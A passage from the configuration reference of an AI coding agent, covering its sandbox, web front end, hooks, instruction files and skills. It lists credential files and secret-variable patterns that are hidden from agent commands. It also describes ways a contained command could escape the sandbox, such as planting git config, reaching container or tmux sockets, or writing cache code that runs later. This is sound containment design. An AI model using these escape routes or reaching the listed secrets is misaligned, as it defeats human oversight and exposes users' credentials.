**Set it to `false` when the deadline is a guarantee you need.** That is the only setting under which a
command cannot outlive the call that started it. The cost is the killed command's partial output: the
kill path returns an error and no output, so whatever it printed before the deadline — a failing
build's error included — is lost.

A malformed value warns at startup and the default is kept, rather than refusing to start over a
behaviour switch.

## `sandbox` — where the model's commands run

```json
"sandbox": {
  "enabled": true,
  "network": true,
  "writable": ["~/work/shared-out"],
  "hidden": ["~/.config/some-tool"],
  "hiddenEnv": ["MY_SERVICE_*"],
  "passEnv": ["NPM_TOKEN"]
}
```

F8's **General** tab sets every key; `/sandbox on` and `/sandbox off` set `enabled` and apply it to the
tab they are typed in at once. `/sandbox` shows what a command may touch here.

On Linux, every shell command the model runs (its own, a sub-agent's, a background one) runs inside
[bubblewrap](https://github.com/containers/bubblewrap). **Absent means on.** Every key is optional:

| Key | Default | What it does |
|---|---|---|
| `enabled` | `true` | `false` runs commands as you, as before the sandbox. |
| `network` | `true` | `false` gives each command an empty network of its own: nothing leaves, and installs, restores and pushes fail. |
| `writable` | `[]` | Folders a command may write besides the built-in ones. `~` is your home. |
| `hidden` | `[]` | Folders or files a command sees as empty, besides the built-in ones. |
| `hiddenEnv` | `[]` | Variable names or `*` patterns removed from a command's environment, besides the built-in ones. |
| `passEnv` | `[]` | Variable names kept even when a pattern would remove them. |

**What a contained command gets**, in the order it is applied, a later line winning over an earlier one:

| What | Access |
|---|---|
| The whole filesystem | Read-only |
| The project: the repository root, or the working folder outside a repository. A sub-agent spawned with a folder of its own gets only that folder. A dotfiles repository at your home does not count: the working folder is the project then. | Read-write |
| Your home's top-level dot files and folders, when the project is your home itself | Read-only (the caches below are writable again after) |
| `.git` and each submodule's git folder | Bound onto themselves, so they cannot be renamed and rebuilt |
| A linked worktree's shared `.git` in the main repository | Read-write, its `hooks` and `config` read-only |
| The temp folder, and `~/.cache`, `~/.nuget/packages`, `~/.npm`, `~/.cargo/registry`, `~/.cargo/git`, `~/go/pkg/mod`, `~/.m2/repository`, `~/.gradle/caches`, `~/.local/share/pnpm`, `~/.yarn` where they exist | Read-write |
| `writable` | Read-write |
| Inside the project: `.git/hooks`, `.git/config`, each submodule's and each worktree's git config, a `core.hooksPath` folder, `.cxagent`, `.vscode`, `.claude`, `.idea`, `.github`, `.husky`, `.envrc`, `.devcontainer` | Read-only: what is in them runs later, outside the sandbox |
| cxagent's own folder and the folder a single-file build extracts its native libraries to | Read-only |
| `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.azure`, `~/.kube`, `~/.docker/config.json`, `~/.netrc`, `~/.git-credentials`, `~/.config/gh`, `~/.config/hub`, `~/.config/gcloud`, `~/.npmrc`, `~/.pypirc`, `~/.pgpass`, `~/.my.cnf`, `~/.vault-token`, `~/.password-store`, `~/.cargo/credentials(.toml)`, `~/.nuget/NuGet/NuGet.Config`, agent credential files, cxagent's config folder, and `hidden` | Seen empty |
| `$XDG_RUNTIME_DIR` and `/run/user/<uid>`, `/tmp/tmux-<uid>`, `/tmp/.X11-unix`, the Docker and Podman sockets | Seen empty: a read-only folder does not stop a connection to a socket, and these let a command run things outside the sandbox |
| The agent's own log folder, inside the config folder | Read-only, so a command reads an earlier one's long output |

The writable root comes from the agent's folder, never from where a call asks to run: a `working_dir`
of your home does not make your home writable. `writable` and `hidden` entries must start with `/` or
`~`; a relative one is ignored with a warning, since it would mean a different folder on each launch.
In F8 they are typed one per line.

**The environment** loses `DBUS_SESSION_BUS_ADDRESS`, `SSH_AUTH_SOCK`, `TMUX`, `TMUX_PANE`, `DISPLAY`,
`WAYLAND_DISPLAY`, every name matching one of these patterns (case ignored):

```
*_API_KEY   *_APIKEY   *_KEY   *_TOKEN   *_SECRET*   *PASSWORD*   *_PWD   *_CREDENTIALS   AWS_*   DATABASE_URL
```

every variable `config.json` reads with [`{env:NAME}`](#envname-and-filepath--secrets-kept-out-of-the-file),
and `hiddenEnv`. `passEnv` keeps a name back. They are removed
from bubblewrap itself, not only from the command, since bubblewrap's own environment is readable from
inside. A variable the call sets in its own `env` is kept, since the call asked for it, and is set
inside the sandbox, never on bubblewrap.

**The prompt.** A contained command runs without asking in a trusted folder under Accept edits or
`auto` (and `auto` does not consult the classifier for it). Under Always ask, or in a folder that is
not trusted, it asks as any command does. A command can ask to run outside with `unsandboxed: true`
and a `reason`: that always prompts, offers no Always, and no rule, hook or mode can approve it.
Headless refuses it, and `--dangerously-skip-permissions` runs it with a line on stderr.

**What mounts cannot hold.** A contained command can write `.git/commondir` or rewrite a `.git` pointer
to send git to a config it planted, and it can create a protected folder the project does not have yet
(`.cxagent`, `.github`): a folder that does not exist cannot be held read-only without creating it in your
repository. So these are checked before and after every contained command. A change is said in the
session and on the row (`git files changed`), and from then on contained commands ask, until you have
looked and run `/sandbox review`. A legitimate `git init` or `mkdir .github` trips it too. cxagent's own
git calls (the status panel, `/diff`) run with the repository's fsmonitor and hooks turned off, so the
app is never what runs a redirected command.

**bubblewrap itself** is found once, when cxagent starts, on `PATH`, and only a copy a contained command
could not have written is used: not under your home or the temp folder, not writable by others. A
`bwrap` in `~/.local/bin` is passed over; install the bubblewrap package system-wide.

**Where it cannot run:**

| Machine | What happens |
|---|---|
| bubblewrap starts | Contained |
| bubblewrap installed, will not start (user namespaces blocked, AppArmor) | Each command asks "Sandbox could not start: … Run this command uncontained?"; headless refuses |
| bubblewrap not installed, or not Linux | Commands run as before, through the normal prompts; the session says so once |

**What it does not cover.** With `network` on, a contained command can send out anything it can
read, and can reach abstract sockets (some X11 and D-Bus setups use them); only `network: false` closes
those. Other sockets in the shared `/tmp` than the ones listed above stay reachable. The package caches
are writable, and some hold code that runs later (NuGet build targets, pre-commit hooks, downloaded
browsers), just as the project's own scripts do. A nested repository that is not a submodule keeps its
own `.git/hooks` writable. Your own shell tabs and `!` lines, hooks, MCP servers, plugins and the file
tools run as before. A command still writes anywhere in the project: commit before you let it loose,
and `git` is the undo.

Only your own config sets the sandbox. Nothing in a repository's `.cxagent` folder can turn it off or
widen it. In the library, `AgentConfig.Sandbox` is null, so off, unless set.

## `web` — the browser front end

```json
"web": {
  "port": 5180,
  "bind": "127.0.0.1",
  "selfSigned": false,
  "login": "auto",
  "users": { "me": "pbkdf2:sha256:600000:…", "guest": "a plain password works too" },
  "roots": ["~/source"],
  "idleMinutes": 30,
  "allow": { "plugins": true, "openAnywhere": false, "shell": false, "config": false }
}
```

Read by `cxagent web` and by `/web` in the terminal. `--port`, `--bind` and `--self-signed` override the
first three for one run. **User config only**: nothing a repository brings can add a user or a root.

| Key | Default | What it does |
|---|---|---|
| `port` | `5180` | The TCP port. |
| `bind` | `127.0.0.1` | The address to listen on, as an IP address. Loopback keeps it to this machine; `0.0.0.0` is every interface. |
| `selfSigned` | `false` | Serve HTTPS with a certificate made once and kept as `web-cert.pfx` in this directory (owner-only). Remade only when it expires or no longer names the address it serves. |
| `login` | `"auto"` | Who must log in: see below. |
| `users` | `{}` | User name to password. A value starting `pbkdf2:` is a hash, written by `cxagent web passwd <name>`; anything else is the password itself. |
| `roots` | `[]` | Folders a browser may open sessions under, `/` or `~` anchored. Empty means the folder the server started in. A link under a root that points outside it does not count as under it. |
| `idleMinutes` | `30` | How long a session nobody has open in a browser, with no turn running and nothing waiting on you, stays loaded under `cxagent web`. `0` keeps it. The terminal's own sessions never unload. |
| `allow` | see below | What a browser may do beyond the conversation. |

**`allow`**, one switch each, set here or in F8 › Web › Browser access. A browser shows them and never
changes them, nor the users or the roots, even with `config` on:

| Switch | Default | What a browser gets |
|---|---|---|
| `plugins` | `true` | The plugin marketplace and `/plugin`. A download asks first; a plugin shows its hash and asks before it loads. |
| `openAnywhere` | `false` | The editor beyond `roots`: any file the terminal's `/open` reaches. |
| `shell` | `false` | A real shell in a tab — as you, outside the sandbox, with no prompts. |
| `config` | `false` | The configuration page: F8's tabs as forms and config.json as text, keys shown as their last four characters; and `/trust`, `/init`, `/think --save`, `/mcp reload` and `/hooks review`. Adding or changing a hook's or a local MCP server's command needs `shell` too: it runs as you. The `web` block is never shown or changed. |

A switch of the wrong type is warned about and stays at its default — off, for the three that widen
what a login reaches. [COMMANDS.md](COMMANDS.md#web) says what a browser can do with each.

**`login`**, by where the server listens:

| Mode | Bound to loopback (`127.0.0.1`, `::1`) | Bound to any other address |
|---|---|---|
| `auto` | No login | Login required. With no `users`, it refuses to start and says how to add one. |
| `always` | Login required | Login required |
| `off` | No login | No login. It starts, and says on the console and on every page that anyone who reaches the port gets an agent that runs commands on this machine — anyone, that is, who addresses it by one of the names below. |

A login lasts 30 days in that browser, or until **Log out**, which also closes that login's open
tabs. A restart logs everyone out. Each failed login from an address makes that address wait longer
(1, 2, 4 … 30 seconds) before its next attempt is checked at all.

**Without a login, only this machine's own names are served** — `localhost`, `127.0.0.1`, `::1`, the
machine's name, and the address it is bound to (every address the machine has, when bound to `0.0.0.0`).
A request naming any other host is refused with `421`. A web page cannot make its own domain stand in
for those, so it cannot reach the server through your browser; someone on your network who types one of
those addresses can, which is what the `off` row warns about.

**Behind a reverse proxy, set `login` to `always`.** `auto` decides by the address the server is bound
to, not by who connects, so a server bound to loopback behind nginx, Caddy or Tailscale's serve asks for
no login. Requests carrying the proxy's public name are then refused as an unknown host, and a proxy
that rewrites `Host` to `localhost` lets in everyone who reaches the proxy. With `always`, every login attempt
comes from the proxy's one address, so the failed-login wait is shared by everyone behind it. The proxy
must pass WebSocket upgrades through; for nginx:

```nginx
location / {
    proxy_pass http://127.0.0.1:5180;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
}
```

Caddy needs only `reverse_proxy 127.0.0.1:5180`. The login cookie is marked `Secure` only when cxagent
itself serves HTTPS, and like every cookie it is sent to any port on the same host name.

## `webSearch` — where `web_search` looks

```json
"webSearch": { "tavilyApiKey": "{env:TAVILY_API_KEY}" }
```

F8's **General** tab sets it too, in its *Web search* section.

**Optional.** With no block, or no key, `web_search` uses **DuckDuckGo**, which needs no account, so
search works on a machine with nothing configured. With a **Tavily** key, searches go to Tavily, whose
results carry text from the page itself and often save the follow-up `web_fetch`. Tavily's free tier is
1,000 searches a month with no card (as of November 2026; see tavily.com).

**`{env:NAME}` and `{file:path}` work here** ([how](#envname-and-filepath--secrets-kept-out-of-the-file)),
so the key need not sit in this file. An unset variable or an unreadable file warns at startup and leaves search on DuckDuckGo; a key that is not a string does the same. Neither
stops the config loading.

The model may name an engine for a call. When it does not, Tavily is used if there is a key, and a
failed Tavily search (a refused key, a used-up quota) is retried on DuckDuckGo, saying so in the
result. Every search asks first, like `web_fetch`, and *always allow* covers one engine: allowing
DuckDuckGo does not allow sending queries to Tavily.

## `memory` — notes across sessions

```json
"memory": { "enabled": false }
```

F8's **General** tab sets it too, in its *Memory* section.

**On when absent.** The session's agent gets the `memory` tool and an index of its notes in the system
prompt; sub-agents get the index and may read, never write. `false` removes both. Notes already kept
stay on disk, and come back when it is turned on again. A value that is not `true` or `false` warns at
startup and leaves memory on.

Notes live in this folder, under `memory/` — see [What else lives in that directory](#what-else-lives-in-that-directory).
[`/memory`](COMMANDS.md#memory) lists, opens and forgets them.

An application built on cxagent.Core has memory **off** unless it sets `AgentConfig.Memory = true`.

## `colleagues` — workers kept across sessions

```json
"colleagues": { "enabled": false }
```

F8's **Colleagues** tab sets it too, under *Settings*, and so does the browser's config page.

**On when absent.** The session's agent gets the `colleague` tool — list, bring one in, keep a worker,
which asks you first — and, when there are any, a list of the colleagues in its system prompt.
`false` removes both; colleagues already kept stay on disk. A value that is not `true` or `false`
warns at startup and leaves colleagues on.

**Suggestions.** `"colleagues": { "suggest": false }` stops cxagent offering to keep a worker. On when absent: a
worker you steered twice, the agent followed up three times, or that did four rounds of work in a session gets one
line in the conversation — *Keep* or *Not this one* — once per worker, never a question that waits. F8's Colleagues
tab and the browser's config page set it under *Settings*. A value that is not `true` or `false` warns and leaves it on.

A colleague runs only on a model with a context window of at least 128k tokens, and starts with a
quarter of that window (at most 100k) of its experience. A provider entry whose window cxagent cannot
learn needs `contextWindow` set for a colleague to run on it.

**Workplaces are read without asking.** A colleague reads files in the folders it has worked in without a prompt, while
each folder is trusted (`/trust`) and still there — reads only. While `cxagent web` or `/web` serves the session, such a
read outside the `web.roots` folders asks, and so does recalling what was read there.

**Each colleague's models are its own,** in its `colleague.json`, not here: where it runs — the
entry it was kept on, or the session's model — and where its rounds are distilled — its own model unless
set. F8's Colleagues tab and the browser's page choose both from the provider entries, and refuse one
whose `contextWindow` is under 128k. A save there is used at its next bring; one already working keeps
its model. The same page renames it — its old names still find it — and sets whether it **learns** or is **frozen** — frozen, its rounds are kept and none is
distilled, and unfrozen it learns again from that moment ([`/colleagues freeze`](COLLEAGUES.md#how-it-works) does the same).

Colleagues live in this folder, under `colleagues/` — see [What else lives in that directory](#what-else-lives-in-that-directory).
[`/colleagues`](COMMANDS.md#colleagues) lists them, keeps a worker and brings one in; [COLLEAGUES.md](COLLEAGUES.md) has the
whole of it, with a tutorial.

An application built on cxagent.Core has colleagues **off** unless it sets `AgentConfig.Colleagues = true`.

## `hooks` — commands that run on the agent's events

```json
"hooks": {
  "PreToolUse": [
    { "matcher": "run_shell",
      "hooks": [ { "type": "command", "command": "~/bin/guard-shell.sh", "name": "guard" } ] }
  ],
  "PostToolUse": [
    { "matcher": "write_file|replace_in_file",
      "hooks": [ { "type": "command", "command": "dotnet format --include \"$(jq -r .tool_input.path)\"" } ] }
  ]
}
```

A hook is a command cxagent runs when something happens: before a tool call, after one, when a prompt
is sent, when a turn ends, when a session opens or closes, when a permission prompt is waiting. It reads
the event as JSON on stdin and answers with its exit code, and optionally with JSON on stdout. F8's
**Hooks** tab adds, edits, moves and removes them; `/hooks` lists what this session runs.

### Where hooks come from

| File | Whose | Runs |
|---|---|---|
| `hooks` in `config.json` | system, in every folder | always |
| `<repo>/.cxagent/hooks.json` | the project's, committed with it | only in a trusted folder |
| `<repo>/.cxagent/hooks.local.json` | the project's, on this machine only (add it to `.gitignore`) | only in a trusted folder |

The two project files hold the same `hooks` block, inside `{ "hooks": { … } }`. Every source's hooks
run; none overrides another. `<repo>` is the top of the git repository the folder is in; outside a
repository, no project file is read.

**A repository's hooks are commands from whoever wrote the repository**, so they run only once you
trust the folder (the question at startup, `/trust`, or F8's **Project** tab). System hooks, from `config.json`, run everywhere.
The folder whose trust counts is the one you work in: trusting `repo/docs` and working there runs the
repository's `.cxagent/hooks.json`, which sits at its top. A folder trusted after the session opened (by
the startup question) still gets the project's `SessionStart` hooks, once, before the next prompt is sent. Trust is checked each
time an event fires: trusting the folder mid-session starts its hooks at once, and revoking it stops them.

**Hooks are read when the session starts.** A hooks file that changes while it runs, by a `git pull`,
another editor or the model, does not take effect on its own. cxagent says so at the next turn;
`/hooks` lists what a review would add and remove, every field of each hook, `/hooks review` applies it and says what it applied,
and F8 marks hooks that are not running yet. A save in F8 applies the files that dialog showed, in the
tab it was opened from; if one changed on disk while it was open, only the system hooks are applied and
the change waits for `/hooks review`. Other tabs take the system hooks only.

### Events

| Event | When | What a hook can do |
|---|---|---|
| `SessionStart` | a session opens or resumes | add context for the model |
| `UserPromptSubmit` | before your prompt reaches the model | block it; add context |
| `PreToolUse` | before a tool runs, after its arguments are checked | deny, ask, allow, or rewrite the arguments |
| `PermissionRequest` | a permission prompt is about to show | answer it: allow or deny |
| `PostToolUse` | after a tool succeeds | tell the model something about the result |
| `PostToolUseFailure` | after a tool fails | the same, for a failure |
| `Stop` | the agent is about to finish its turn | send it back to work, with a reason |
| `StopFailure` | a turn ends on a provider error | (notification only) |
| `Notification` | a permission prompt is waiting for you | (notification only) |
| `SessionEnd` | a session closes | (notification only) |
| `UserPromptExpansion` | a `/command` or skill is about to become a prompt | block it; add context |
| `PermissionDenied` | auto mode's reviewer refused a call | let the model know it may retry |
| `PostToolBatch` | every call from one model reply has its result | add context; stop before the next model call |
| `MessageDisplay` | the session's reply is shown (a sub-agent's is not) | (notification only) |
| `SubagentStart` | a sub-agent takes its first task | add context for the sub-agent |
| `SubagentStop` | a sub-agent is about to finish | send it back to work, with a reason |
| `TaskCreated` | a to-do write adds an item (a renamed item counts as new) | refuse the write |
| `TaskCompleted` | a to-do write closes an item | keep it open, with a reason |
| `InstructionsLoaded` | an instruction file is read at the start | (notification only) |
| `ConfigChange` | a saved config is about to reach a session | a system hook: keep that session on what it had. A repository's hook is told, and cannot block |
| `CwdChanged` | a resume moves the session to another folder | (notification only) |
| `PreCompact` | before compression, `/compress` or automatic | skip it |
| `PostCompact` | after compression, with its summary | (notification only) |
| `PreModelSwitch` | before `/model` switches | cancel the switch |
| `PostModelSwitch` | after it switched | add context for the next request |

Eight events of the hook format have nothing in cxagent to fire on: `Setup`, `TeammateIdle`,
`Elicitation`, `ElicitationResult`, `DirectoryAdded`, `FileChanged`, `WorktreeCreate` and
`WorktreeRemove` (worktrees come from the worktree plugin, not from cxagent itself). A hook on one loads,
shows as *not supported here* in F8 and `/hooks`, and does not fire.

**The matcher** picks the tools a tool event applies to: a pattern matched against the whole tool
name, `run_shell` or `write_file|replace_in_file`. Empty or `*` is every tool. `SessionStart` matches
on how the session started (`startup`, `resume`), `Notification` on its kind (`permission_prompt`),
`SubagentStart` and `SubagentStop` on the sub-agent's type, `UserPromptExpansion` on the command's name,
`PreCompact` and `PostCompact` on `manual` or `auto`, and the model switches on the model switched to.

### What a hook reads

Every event's JSON carries `session_id`, `transcript_path` (the session's `history.jsonl`), `cwd`,
`hook_event_name`, `permission_mode`, and `agent`: `main`, or the sub-agent's type and id when a
sub-agent made the call. Then the event's own fields:

| Event | Fields |
|---|---|
| tool events | `tool_name`, `tool_input` (the arguments as the model sent them), `tool_use_id`; `tool_response` after success, `error` after failure |
| `UserPromptSubmit` | `prompt` |
| `Stop` | `last_assistant_message`, and `stop_hook_active`: true when this turn already went on because a Stop hook said so |
| `SessionStart` · `SessionEnd` | `source` · `reason` |
| `Notification` | `message`, `notification_type` |
| `StopFailure` | `error` |
| `UserPromptExpansion` | `expansion_type`, `command_name`, `command_args`, `command_source`, `prompt` |
| `PermissionDenied` | `tool_name`, `tool_input`, `reason` |
| `PostToolBatch` | `tool_calls`: each call's `tool_name`, `tool_input`, `tool_use_id`, `tool_response` |
| `MessageDisplay` | `turn_id`, `message_id`, `index`, `final`, `delta` (the reply's text) |
| `SubagentStart` · `SubagentStop` | `agent_id`, `agent_type`; on stop also `last_assistant_message`, `stop_hook_active`, `agent_transcript_path` |
| `TaskCreated` · `TaskCompleted` | `task_id`, `task_subject` |
| `InstructionsLoaded` | `file_path`, `memory_type` (`Project` or `User`), `load_reason` |
| `ConfigChange` | `source`, `file_path` |
| `CwdChanged` | `old_cwd`, `new_cwd` |
| `PreCompact` · `PostCompact` | `trigger`; `custom_instructions` before, `compact_summary` after |
| `PreModelSwitch` · `PostModelSwitch` | `from_model`, `to_model`, `requested_model`, `source`, `context_tokens` |

The command runs in the repository's top folder, with `CXAGENT_PROJECT_DIR` set to it.

### What a hook answers

| Exit | Means |
|---|---|
| `0` | no objection. Stdout that is a JSON object is read (below); plain stdout is context on `UserPromptSubmit` and `SessionStart` |
| `2` | **block**, with stderr as the reason: the tool call is refused, the prompt not sent, the turn not ended |
| anything else | the hook failed: it is reported and the action goes ahead, unless the hook sets `"onFailure": "block"` |

JSON on stdout says more:

```json
{ "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",
    "permissionDecisionReason": "no network calls from this repo",
    "updatedInput": { "command": "ls -la" },
    "additionalContext": "the build uses bun" },
  "systemMessage": "shown to you" }
```

`permissionDecision` is `allow`, `deny`, `ask` or `defer`. `"continue": false` on any event stops the turn
once the current tool results are recorded, and wins over a Stop hook's block. A `UserPromptSubmit`, `Stop` or `PostToolUse`
hook blocks with `{ "decision": "block", "reason": "…" }`, and a `PermissionRequest` hook answers with
`{ "hookSpecificOutput": { "hookEventName": "PermissionRequest", "decision": { "behavior": "allow" } } }`.

**When several hooks answer one call, the strictest wins:** deny, then defer, then ask, then allow. An
`updatedInput` replaces the tool's arguments before anything else sees them, so a permission prompt
shows what will actually run.

### Hooks and permissions

- **`deny`** refuses the call before it is asked about. The model is told a configured rule refused it.
- **`ask`** brings up the prompt even where nothing else would have asked: a write that accept-edits
  would make silently, a command a stored rule allows, a tool with no permission question of its own
  (a sub-agent spawn, a skill, the to-do list). Under `--dangerously-skip-permissions` it is
  approved, since that flag promises no prompts; in a headless run it is refused, like any prompt there.
- **`allow`** answers a prompt that would otherwise show, and only that. It works in a headless run,
  which is what makes hooks useful in CI. It never answers:
  - a file-tool write into a protected folder (`.git`, `.cxagent`, `.vscode`, `.claude`, `.idea`,
    `.github`, `.husky`, `.devcontainer`, an `.envrc`). That still asks, and the prompt says a hook
    allowed it but the folder is protected, so a repository's hooks cannot let the agent rewrite its
    own guard rails;
  - a sub-agent's file request outside its own folder;
  - an injected or plugin tool's own gate, which nothing exempts.

A decision made by a hook shows on the tool's row, and in the session log, as *hook*.

### Every agent, every run

Hooks fire for the session's agent, for sub-agents and for background agents alike, so a guard cannot
be stepped around by delegating the call. A sub-agent's calls carry its own `agent` value; `Stop` and
`UserPromptSubmit` are the session agent's only. A sub-agent working in a worktree runs the hooks read
from the main repository, never the worktree's copy. A headless run (`cxagent -p`) fires hooks the same
way, with folder trust from `--trust` or the stored decision.

### Each hook's settings

| Key | What it is |
|---|---|
| `type` | `command`, `prompt`, `agent`, `http` or `mcp_tool` (below) |
| `command` | a command hook's line, run by `bash -c` |
| `shell` | `bash` (the default) or `powershell`. On Windows without Git Bash, PowerShell is the default |
| `prompt` | a prompt or agent hook's question. `$ARGUMENTS` stands for the event's JSON; without it, the JSON is added after |
| `model` | the `provider:model` entry a prompt or agent hook asks, by its name in `providers`. Without one, `hooks.defaultModel` |
| `continueOnBlock` | a prompt hook's: on a no, feed the reason back and carry on, rather than end the turn |
| `url` · `headers` · `allowedEnvVars` | an http hook's endpoint, its headers, and the environment variables `$NAME` in a header may read |
| `server` · `tool` · `input` | an mcp_tool hook's server (one of yours), tool, and arguments; a string `${tool_input.path}` reads from the event |
| `timeout` | seconds. Defaults: 600 for command, http and mcp_tool (30 on `UserPromptSubmit`; 10 on `MessageDisplay`, the model switches and `ConfigChange`, which a command waits on), 30 for a prompt, 60 for an agent. A hook still running then is stopped, with any process it started |
| `onFailure` | `"block"`: a hook that crashes, times out, prints broken JSON, or cannot reach its model, URL or server blocks what it guards, instead of letting it through. Meaningful on the events that can block |
| `name` | what messages, F8 and `/hooks` call it. Optional |

### The five types

- **`command`** runs a shell command with the event's JSON on stdin, by the exit-code and output rules above.
- **`prompt`** asks a model one question, which it answers with `{"ok": true}` or `{"ok": false, "reason": "…"}`.
  A no blocks: on a tool call or a prompt it also ends the turn, unless `continueOnBlock` is set; on `Stop`
  and `SubagentStop` it sends the agent back to work, unless the model adds `"impossible": true`.
- **`agent`** does the same with a read-only verifier: an agent that may `read_file`, `glob` and `grep` inside
  the project, and nothing outside it, for up to 50 turns before it answers. It asks nobody. On a no, the
  reason goes back to the model and the turn carries on; after a tool batch, it goes to the model as
  context before its next call.
- **`http`** POSTs the event's JSON to `url`. A 2xx with an empty body is no objection, a 2xx with a JSON
  object is read like a command's output, and anything else is a failure. In a system hook, `$NAME` in a
  header expands only for the variables listed in `allowedEnvVars`, and any other reads empty. A
  repository's http hook expands none at all: it writes its own `allowedEnvVars`, so honouring them would
  let it pick what to send.
- **`mcp_tool`** calls a tool on one of your MCP servers; its text is read like a command's output. A
  repository's mcp_tool hook asks first, with the same prompt and the same stored rules as the model's own
  call of that tool, since your servers act with your accounts. A system hook does not ask.

**Which model a prompt or agent hook asks** is its own `model`, else `hooks.defaultModel`, else nothing: the
hook fails, and says to set one. It is never the session's own model, and a repository's hook can only
name one of your configured providers, never bring its own endpoint or key. Each answers at the lowest
thinking level its model offers, and what it costs is counted in the session's spend and in `/stats`, as
`hook:<name>`. A prompt or agent hook on `PermissionRequest` does not run: that event's answer is a
command hook's.

```json
"hooks": {
  "defaultModel": "openrouter",
  "Stop": [ { "hooks": [ { "type": "prompt", "prompt": "Did the agent finish what was asked? $ARGUMENTS" } ] } ]
}
```

F8's **Hooks** tab sets the default model beside **+ Add hook**, and edits each type's fields.

Hooks matching one event run at the same time. Each one's output is cut at 64 KiB. A hook that starts a
process in the background (`server &`) is done when it exits: its output is read for a second more, and
the process is left running. `SessionEnd` hooks
share a budget of 1.5 seconds, raised to the longest `timeout` one of them sets, up to 60. Closing a tab
starts them and does not wait; quitting waits for them within that budget, and names any it cut off.

**`Stop` hooks are bounded.** A Stop hook that blocks sends the agent back to work with its reason; after
three in one turn the turn ends anyway, and you are told which hook kept it going.

An app embedding the library adds hooks in code: `AgentConfig.Hooks`, with the same JSON and typed
handlers. See [the API reference](cxagent.Core/docs/api.md#hooks-from-code).

## `orchestrator` — caps

```json
"orchestrator": { "maxTurns": 300 }
```

F8's **General** tab sets both: the turn cap as *Default*, *No cap* or *Cap at* a number, and the
compaction threshold, whose hint shows the default's number for the model you are on.

`maxTurns` is how many turns one request may take before the agent stops and summarises what it
got. A number applies to the session agent *and* to sub-agents: a child inherits it unless its own
type sets `agents.<name>.maxTurns`. A headless run's `--max-turns N` sets it for that run.

**Absent, the session agent has no cap** — you are watching it and can stop it — **while sub-agents
keep a built-in ceiling of 300**, since a runaway worker inside a fan-out costs the whole plan. **`0`
means no cap for both**, the explicit opt-out.

`contextCompressThreshold` is the other key here — compact above this many tokens. Absent, it is
80% of the model's context window when that is known, and a built-in threshold when it is not.

---

## Instruction files — `AGENTS.md` and friends

Separate from `config.json`, and answering a different question: config is *how this app is wired*,
instructions are *what an agent should know here*. They ride in the system message.

**Two files apply, in this order:**

1. **The global one** — `CXAGENT.md` in cxagent's config directory. What is true of you wherever you
   work.
2. **The nearest project one** — searched by walking up from the working directory, stopping at the
   repository root (the directory holding `.git`). Outside a repository only the working directory
   itself is read: with no worktree there is no boundary that means anything, and climbing would let
   a scratch folder under your home directory pick up that directory's own files.

**Project file names, first match wins:**

| Name | Why in this order |
|---|---|
| `CXAGENT.md` | So a repo can address **this** agent specifically. Some instructions are only true of cxagent — its permission model, its process — and a shared file is the wrong place for them. |
| `AGENTS.md` | The vendor-neutral convention, and what a repo will already have if it has anything. |
| `CLAUDE.md` | Last, so a repo carrying only that one is still honoured. |

**One NAME, but every level inside the repo that has it.** The first name that matches anywhere wins,
and then every copy of *that* name from the repository root down to here is used, root first — so the
nearest file is rendered last and wins on a conflict. The monorepo case is why: a root file carries
the house style, a package file carries what is specific to that package, and both are true at once.
What is never mixed is the *names* — a repo with `AGENTS.md` at its root and `CLAUDE.md` in a
subdirectory gets the `AGENTS.md`.

**The global file is `CXAGENT.md` and only that.** No `AGENTS.md` at that path — no other agent reads
cxagent's config directory, so the shared name buys nothing and invites confusion. No global
`CLAUDE.md` either: a `CLAUDE.md` describes a *project*, and reading one from a home directory
applies project instructions to every project.

**Capped at 8,000 characters, and the cut is marked in the text.** This rides in the prompt-cache
prefix that is re-sent on every turn, so a large instruction file is not a one-off cost but a
permanent tax on the window. Instructions that stop mid-sentence with no explanation read as a bug in
the agent, so the truncation says so.

**A project's file must really be in the repository.** A project `AGENTS.md` (or `CXAGENT.md`, `CLAUDE.md`)
that is a link pointing outside the repository is not read, and a warning says so once per session. It
would otherwise put whatever it points at — a key, `/proc/self/environ` — into the prompt of anyone who
clones the repository. A link that stays inside the repository (`AGENTS.md → docs/AGENTS.md`) reads as
usual. If you share one instruction file across many repositories by linking it in, put it in your global
`CXAGENT.md` instead — your own config folder may link anywhere. A device or a pipe is never read, and a
file in UTF-16 or with a byte-order mark reads as its text.

---

## Skills

Instructions the model loads **when it needs them**, instead of paying for them on every turn.

The split is the whole point: a skill's **name and description** ride in the system prompt
permanently and cost a few hundred characters, while its **body** is fetched by a tool only when the
model decides a task matches. Twenty skills of 3k each would be 60k of permanent prefix; their
catalog is a rounding error.

**A skill is a directory with a `SKILL.md`:**

```
.cxagent/skills/
  double-entry-posting/
    SKILL.md
```

```markdown
---
name: double-entry-posting
description: Use when adding, reviewing or fixing any ledger posting or balance
  logic in this repo. Covers house rules that are not obvious from the code.
---

# Double-entry posting

Every posting must sum to exactly zero. A transaction that does not balance is
rejected, never auto-corrected.
```

**The description is the entire interface.** It is the only thing the model sees before deciding, so
write it as *"Use when…"* rather than as a title. A description that says WHEN beats one that says
WHAT — the model is matching a task against it, not reading a table of contents.

**Where they live — every folder below is read, and for a name that appears in more than one, the
nearest wins:**

| Location | Meaning |
|---|---|
| `<repo>/.cxagent/skills/` | This project, addressed to this agent |
| `<repo>/.agents/skills/` | This project, vendor-neutral — the plural of the `AGENTS.md` convention |
| `<config dir>/skills/` | You, wherever you work |

The project folders are searched by walking up from the working directory to the repository root,
nearest first, so a package's own skills outrank the repo's. Same boundary as the instruction files,
and it matters more here: a skill is text the model reads **and acts on**, and the directories above
your home folder are writable by other people on a shared machine. At one level the order is the
table's: `.cxagent` before `.agents`, because a file written for this tool says more about what is
meant here.

**Skills shadow per name, not per folder.** Two `SKILL.md` files with the same name are two
*versions* of one document, and merging them produces a document that contradicts itself — so the
nearest one is used and the other is listed by `/skills` as shadowed. Skills with different names all
load: a repo with its own skills still leaves yours available. A command file of the same name
(below) shadows a skill too, and then the skill is not offered to the model either — one name means
one thing.

**Claude Code's `.claude/skills` are not read**, in the repo or in `~/.claude`. They are written for
that tool — its tool names, its subagents — and followed here they become instructions the model
cannot carry out. A skill that suits both can be copied or symlinked into `.cxagent/skills` or
`.agents/skills`; a folder reached twice through a link is read once.

**`allowed-tools` and `model` in a skill's frontmatter are ignored**, and `/skills` says so:
`allowed-tools` is a permission grant written for another application's tools, and obeying it would
